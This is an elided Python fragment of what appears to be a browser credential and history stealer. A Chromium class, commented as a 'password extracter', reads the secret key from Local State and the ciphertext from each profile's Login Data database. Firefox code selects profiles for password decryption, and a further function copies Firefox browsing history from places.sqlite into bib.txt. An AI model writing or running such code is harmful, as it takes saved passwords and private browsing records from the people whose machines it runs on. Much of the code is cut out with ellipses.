...
class Chromium():
    def get_secret_key(self):
        ...
        # (1) Get secretkey from  local state
    ...
    def get_db_connection(self,path_login_db):
    ...
    def main(self,path,local_path):
        global PATH, PATH_LOCAL_STATE
        PATH_LOCAL_STATE = local_path
        PATH = path
        ...
        folders = [element for element in os.listdir(PATH) if
                   re.search("^Profile*|^Default$", element) != None]

        for folder in folders:
            # (2) Get ciphertext from sqlite database
            path_login_db = os.path.normpath(r"%s\%s\Login Data" % (PATH, folder))

            conn = self.get_db_connection(path_login_db)
...
Chromium=Chromium() #initializing chromium class (password extracter)


#***********For firefox Password****************************
LOG: logging.Logger
VERBOSE = False
...
def ask_section(sections: ConfigParser, choice):
    """
...
def get_profile(basepath: str, interactive: bool, choice: Optional[str], list_profiles: bool, x):
    """
    ...
    try:
        ...
        if len(sections) == 1:
            ...
            pass_choice = x
            section = ask_section(sections, pass_choice)
...
def main(x) -> None:
    ...
    profile = get_profile(basepath, args.interactive, args.choice, args.list, x)
...
def main2():
    ...
    firefox_directory = os.path.expanduser('~') + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"

    firefox_profiles = os.listdir(firefox_directory)

    for profile in firefox_profiles:
        database_file = os.path.expanduser('~') + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + profile + "\places.sqlite"
        try:
            ...
            for record in browsing_data:
                ...
                with open('bib.txt', 'a') as b:
                    b.write(f'url : {visit_url} \n')
                    b.write(f'time: {visit_time} \n')
                    b.write(f'{"*"*50} \n')
